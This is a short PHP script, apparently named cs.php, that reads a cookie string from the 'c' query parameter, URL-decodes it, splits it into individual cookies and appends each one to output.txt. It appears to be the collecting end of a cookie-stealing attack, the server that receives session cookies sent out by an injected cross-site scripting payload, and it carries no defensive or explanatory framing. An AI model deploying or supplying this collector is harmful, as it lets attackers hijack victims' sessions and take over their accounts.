<?php

#Newlines are represented with different characters depending on the system.
#Mac: \r, *nix \n, Windows \r\n
$lineEnding = "\n";

#cs.php?c=isset
if (isset($_GET['c'])) {

	#Split the cookie string into an array of cookies
	#Unescape the javascript escaped string with urldecode
	$cookies = explode(' ', urldecode($_GET['c']));

	#Open file in append mode
	$fp = fopen('output.txt', 'a');

	#Write cookies to file
	foreach($cookies as $cookie) {
		fwrite($fp, $cookie . $lineEnding);
	}

	fclose($fp);
}

?>
